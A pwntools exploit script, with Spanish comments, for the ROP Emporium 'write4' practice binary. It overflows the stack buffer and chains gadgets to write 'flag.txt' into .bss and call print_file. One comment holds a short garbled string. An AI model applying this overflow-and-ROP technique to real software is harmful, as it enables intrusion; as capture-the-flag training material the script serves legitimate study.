#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
elf = context.binary = ELF('./write4')
context.bits = 64

libc = elf.libc
rop = ROP(elf)

gs = '''
break pwnme
continue
'''

def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    if args.REMOTE:
        return remote('127.0.0.1', 5555)
    else:
        return process(elf.path)
r = start()

#============ exploit here ================

#cuando tenemos un libc dcustom, podemos hacer rop

junk = b'A'*40
movr14r15 = elf.sym.usefulGadgets   #mov r14 r15
printfile = elf.sym.print_file      #a esto debemos pasarle como first argument 'flag.txt'
popr14r15 = rop.r14.address         #sacamos el pop r14 r15
bss = 0x601038                      #buscamos en donde podemos escribir objdump -h write4, los que dicen readonly no sirven obviamente. Con vmmap dentro de gdb podemos ver tambien que zonas podemos escribip_olRsWSipiIXNAwQ
poprdi = rop.rdi.address            #buscamos un pop rdi

payload = junk
payload += p64(popr14r15)   #r14 tomara el valor bss
payload += p64(bss)
payload += b'flag.txt'      #r15 tomara el valor flag.txt
payload += p64(movr14r15)   #mov de r15 a r14
payload += p64(poprdi)      #ponemos el valor de la bss(flag.txt) al stack
payload += p64(bss)
payload += p64(printfile)   #llamamos a print file para leer bss(flag.txt)

r.sendlineafter(b'>', payload)

#============= interactive ================

r.interactive()
